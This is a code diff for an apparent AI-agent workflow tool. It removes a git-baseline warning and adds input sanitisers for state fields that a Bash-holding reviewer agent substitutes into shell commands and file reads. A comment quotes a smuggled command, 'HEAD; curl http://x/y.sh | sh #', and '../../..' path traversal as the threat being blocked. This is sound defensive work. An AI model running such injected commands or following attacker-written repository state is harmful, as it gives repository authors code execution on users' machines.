@@ -145,39 +145,27 @@ async function evaluatePreflight(state, basePath) {
     });
   }
 
-  // A `.gsd/` that arrived with the repository rather than being written here
-  // carries no baseline of its own, and the two gates below it both passed on
-  // that: the mismatch check above compares HEADs only when `state.git_head` is
-  // truthy, and plan-drift seeds its baseline from whatever plan files are
-  // present when none is stored. So a transplanted state reconciled against
-  // nothing and drifted from nothing, and resume dispatched an executor — which
-  // holds Bash — on a stranger's task spec.
+  // DO NOT add a "state carries no git_head" hint here. It was tried and
+  // removed, and both reasons are structural rather than fixable by narrowing
+  // the predicate further:
   //
-  // `git_head: null` alone is NOT that signal, and treating it as one (the
-  // audit's wording) breaks every non-git project permanently:
-  // createInitialState sets it to null and getGitHead returns null for any
-  // directory that is not a git repository, so a non-git project carries null
-  // forever and reconcile has no HEAD to offer it as an exit.
+  // 1. It cannot stop anything. The hint's only vocabulary is
+  //    `reconcile_workspace` / `await_manual_intervention`, and
+  //    `workflows/execution-flow.md` — which `commands/resume.md` names the
+  //    single source of truth — puts that pair OUTSIDE the terminal set and
+  //    tells the orchestrator to set git_head and continue the loop. The gate
+  //    cost one extra state-update and changed nothing.
+  // 2. It cries wolf on a normal flow. `git rev-parse --short HEAD` exits 128
+  //    in a repo with no commits yet, so `git init` → scaffold → state-init →
+  //    first commit records `git_head: null` and then trips the pair. Any
+  //    transient getGitHead failure does the same permanently: utils.js catches
+  //    every throw, including its 5s timeout, and writes null once and forever.
   //
-  // The pair is the narrow form: the workspace IS under git, and the state
-  // still records no HEAD. state-init inside a git repo always writes one, so
-  // for a project this tool created, that pair is reachable by a state that was
-  // not created here — or by an init that ran before `git init`, which
-  // resume.js's reconcile guidance already tells the user how to leave.
-  //
-  // Placed beside the mismatch hint rather than after the drift block on
-  // purpose: drift runs only when no hint has fired, and seeding plan hashes
-  // from a workspace we have just declined to vouch for would install the
-  // stranger's files as the trusted baseline.
-  if (currentGitHead && !state.git_head) {
-    hints.push({
-      workflow_mode: 'reconcile_workspace',
-      action: 'await_manual_intervention',
-      updates: { workflow_mode: 'reconcile_workspace' },
-      current_git_head: currentGitHead,
-      message: 'The workspace is a git repository but this state records no git baseline — it may not have been created here. Confirm the plan and set git_head via state-update before resuming.',
-    });
-  }
+  // A security prompt that fires on ordinary work trains people to click
+  // through it, which is worse than not having it. The defence that does hold
+  // is mechanical and lives at the dispatch boundary: see safeCommitRef and
+  // safeWorkspacePaths below, which constrain the state-sourced values that
+  // agents/reviewer.md substitutes into a shell command and a file read.
 
   // Plan drift detection — only run when no prior blocking hint (git_head mismatch)
   // exists, because establishing a baseline in a suspect workspace state would
@@ -299,6 +287,66 @@ function getBlockedTasks(phase) {
     }));
 }
 
+// `.gsd/state.json` is committable, so in a cloned repository every string in
+// it was written by the repository's author. Two of them are not inert: the
+// context protocol in `agents/reviewer.md` tells an agent that holds Bash to
+// build `git diff <commit>~1..<commit>` out of `checkpoint_commit`, and to Read
+// every entry of `files_changed`. Schema validation accepts any string for the
+// first (`schema.js`: "string or null") and any array of strings for the
+// second, so `HEAD; curl http://x/y.sh | sh #` reaches a shell and `../../..`
+// reaches a file read.
+//
+// Telling agents these fields are data (input_provenance) is advisory — it asks
+// a model to decline. Constraining the values is not, so it is the half that
+// runs first. Both are kept: the shapes below let malicious-but-well-formed
+// content through, and that is what the framing is for.
+//
+// Validation deliberately does NOT move into validateState. Rejecting a whole
+// state at read would brick a project whose state is already malformed, with no
+// way to repair it — the failure mode fb61e34 fixed and the state-read spec
+// records. These sanitise at the point of use instead: a bad value is dropped
+// from the payload, the rest of the review proceeds, and the agent is told what
+// went missing rather than silently receiving a short list.
+// 4 is git's own floor for an abbreviated hash (`core.abbrev`), not 7: the
+// default display length is 7+, but a small repo or a configured abbrev can
+// produce shorter, and an over-strict shape would withhold a legitimate commit
+// and break every review for that project. The job here is excluding shell
+// metacharacters and path syntax, not judging entropy, so the loosest shape
+// that is still inert is the right one.
+const COMMIT_REF = /^[0-9a-f]{4,40}$/;
+
+/** A value safe to substitute into a git command, or null. */
+function safeCommitRef(value) {
+  return typeof value === 'string' && COMMIT_REF.test(value) ? value : null;
+}
+
+/** The entries that stay inside the workspace, and a count of those dropped. */
+function safeWorkspacePaths(list) {
+  const kept = (Array.isArray(list) ? list : []).filter((entry) => {
+    if (typeof entry !== 'string' || entry.length === 0) return false;
+    if (entry.includes('\0')) return false;
+    if (entry.startsWith('/') || /^[A-Za-z]:[\\/]/.test(entry)) return false; // absolute
+    if (entry.startsWith('~')) return false;
+    return !entry.split(/[\\/]/).includes('..');
+  });
+  const dropped = (Array.isArray(list) ? list.length : 0) - kept.length;
+  return { kept, dropped };
+}
+
+/** The review/debug projection of a task, with the two substituted fields constrained. */
+function safeTaskRefs(task) {
+  const commit = safeCommitRef(task.checkpoint_commit);
+  const { kept, dropped } = safeWorkspacePaths(task.files_changed);
+  return {
+    checkpoint_commit: commit,
+    files_changed: kept,
+    ...(commit === null && task.checkpoint_commit != null
+      ? { checkpoint_commit_rejected: true }
+      : {}),
+    ...(dropped > 0 ? { files_changed_rejected: dropped } : {}),
+  };
+}
+
 function getReviewTargets(phase, reviewScope, scopeId) {
   if (!phase) return [];
   if (reviewScope === 'task') {
@@ -324,8 +372,7 @@ function getDebugTarget(phase, task, currentReview) {
     retry_count: task.retry_count || 0,
     error_fingerprint: task.last_error_fingerprint || currentReview?.error_fingerprint || null,
     last_failure_summary: task.last_failure_summary || currentReview?.summary || null,
-    files_changed: task.files_changed || [],
-    checkpoint_commit: task.checkpoint_commit || null,
+    ...safeTaskRefs(task),
     debug_context: task.debug_context || null,
   };
 }
@@ -485,4 +532,7 @@ export {
   persistAndRead,
   buildExecutorDispatch,
   tryAutoUnblock,
+  safeCommitRef,
+  safeWorkspacePaths,
+  safeTaskRefs,
 };
